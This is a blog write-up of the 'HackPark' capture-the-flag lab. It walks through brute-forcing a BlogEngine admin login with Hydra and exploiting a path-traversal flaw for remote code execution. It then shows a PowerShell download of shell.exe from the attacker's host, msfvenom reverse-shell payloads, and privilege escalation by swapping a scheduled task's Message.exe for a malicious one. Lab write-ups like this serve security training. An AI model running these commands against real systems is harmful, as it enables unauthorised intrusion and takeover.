---
layout: post
title:  "HackPark"
categories: blog
layout: post
---

<!--more-->

# Scanning

Let's begin by scanning the target using RustScan.

```
rustscan -a 10.10.120.14 -r 1-65535 --ulimit 5000 -- -sVC
```

<img src="images/06.HackPark/01.png" height="700">

# Enumeration

We can see two open ports. Let's see what's running on port 80.

<img src="images/06.HackPark/02.png" height="700">

If we click on the menu icon, we can see the login page.

<img src="images/06.HackPark/03.png" height="400">

We can see that the login page belongs to blogengine.

<img src="images/06.HackPark/04.png" height="500">

Now, we will try to use the default credentials admin:admin to see if that works. But it failed. Now, let's bruteforce the password with the username admin as we know that the default username is admin.

First, we will fire up Burp Suite to see what type of request the login page is making to the web server. Let's enter admin:admin in the username and password fields and intercept this using Burp Suite.

<img src="images/06.HackPark/05.png" height="500">

We can see that the login page is making a POST request. We will now use Hydra to brute force the password field assuming the username is admin.

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.120.14 http-post-form "/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=Pw49CE7XN99O07VsfmUKlS3GQsevl39oxTcHs0fj672xrsEdiwp26MjPpiJLmnJc%2Badroz9oDltpxOKHPbB6cf7nhiuXQBiHwnZYUwx%2BFAGXtU1YQQcxOXrvAntLHand12BsvenypZEkD5DkrYrd6pOBUBnwCzdk6T3Aco66LLlCpW4A&__EVENTVALIDATION=B93mjHyaWPm5JljuEQuMNVayeIlWC4kRbNsrSF9DjvDYBb6ZBhz%2Byag9pTRt8hhBdxWgdwlqd9DiLXamGJERhiMUxR814calYKBvOWaCNKv3zyDSzKVhONt5%2BvmcuOkDTIDPGB6Bpq0Dktu4om3tg%2BjlkZrV4I5NyuuANXrlQgJH71q8&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed" -v
```

<img src="images/06.HackPark/06.png" height="500">

It shows that we successfully found the password for the username admin. Now, let's login using the username admin and the password we found.

<img src="images/06.HackPark/07.png" height="500">

We can see a dashboard and when we click on about, we can see the version of the blogengine.

<img src="images/06.HackPark/08.png" height="500">

Now, we will use searchsploit to find any available exploits.

<img src="images/06.HackPark/09.png">

We can see an exploit for the version 3.3.6. Now, copy that exploit to the current path.

<img src="images/06.HackPark/10.png">

We can see the description of the exploit and how to use it.

<img src="images/06.HackPark/11.png" height="600">

# Exploitation

This is a path traversal vulnerability leading to remote code execution which is caused by an unchecked theme parameter that is used to override the default theme for rendering blog pages.

Change the ip address and port number in the exploit and save it as PostView.ascx.

<img src="images/06.HackPark/12.png">

Now, navigate to the path that was mentioned in the website.

```
 http://10.10.120.14/admin/app/editor/editpost.cshtml
```

Click on the file manager icon and then upload the PostView.ascx file.

<img src="images/06.HackPark/13.png" height="300">

Let's start the netcat listener on port 2222.

```
nc -lnvp 2222
```

<img src="images/06.HackPark/14.png" height="200">

Now we will navigate to the path as show below to trigger the vulnerability.

```
http://10.10.120.14/?theme=../../App_Data/files
```

<img src="images/06.HackPark/15.png" height="200">

We received a shell in the netcat listener!

<img src="images/06.HackPark/16.png" height="200">

We will elevate out netcat shell to meterpreter shell. We will start this by generating a payload using msfvenom.

<img src="images/06.HackPark/17.png" height="200">

Start metasploit and use exploit multi/handler.

```
use multi/handler

set lhost tun0

set lport 3333

exploit
```

<img src="images/06.HackPark/18.png" height="300">

Start the python http server using the following command. It serves on port 8000 by default.

```
python -m http.server
```

Now, download the payload to the target machine and run it.

```
powershell -c wget http://10.6.10.164:8000/shell.exe -outfile shell.exe
```

<img src="images/06.HackPark/19.png" height="500">

We now got a reverse shell via metasploit!

<img src="images/06.HackPark/20.png" height="500">

# Privilege Escalation

## Method 1: Using meterpreter's getsystem

Use the command getsystem to elevate the privileges from local user to root user.

<img src="images/06.HackPark/21.png" height="500">

## Method 2: Using Windows Scheduled Task

We already have the meterpreter reverse shell. Let's see what all processes are running.

<img src="images/06.HackPark/22.png" height="700">

We can see that there are a lot of process running. Out of them WScheduler.exe is an interesting process because we can try to elevate our privileges by using the scheduled service. If we navigate to the path of SystemScheduler, there are a lot of processes. And when we navigate to events, we can see the log file 20198415519.INI_LOG.txt.

<img src="images/06.HackPark/23.png" height="700">

<img src="images/06.HackPark/24.png" height="500">

When we see the contents inside the log file, there is a specific process Message.exe running as administrator. So, let's try to replace this Message.exe with our malicious exe file with the same name.

<img src="images/06.HackPark/25.png" height="600">

We will generate a payload using msfvenom.

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.6.10.164 LPORT=5555 -f exe -o Message.exe
```

Now we will background the current meterpreter session.

```
bg
```

Now set the port to 5555 and run the exploit in background.

```
set lport 5555

exploit -j
```

Now, get back to the first meterpreter session.

```
sessions -l

sessions -i 1
```

Navigate to the path C:\Program Files (x86)\SystemScheduler. Now, move the Message.exe file to some other location.

```
mv Message.exe C:\Windows
```

Now upload the malicious file that we just created using msfvenom.

```
upload Message.exe
```

Keep the current meterpreter session to backround and check the sessions.

```
bg

sessions -l
```

We can find a new session opened as the user Administrator.

<img src="images/06.HackPark/26.png">

We now got a reverse shell as root!
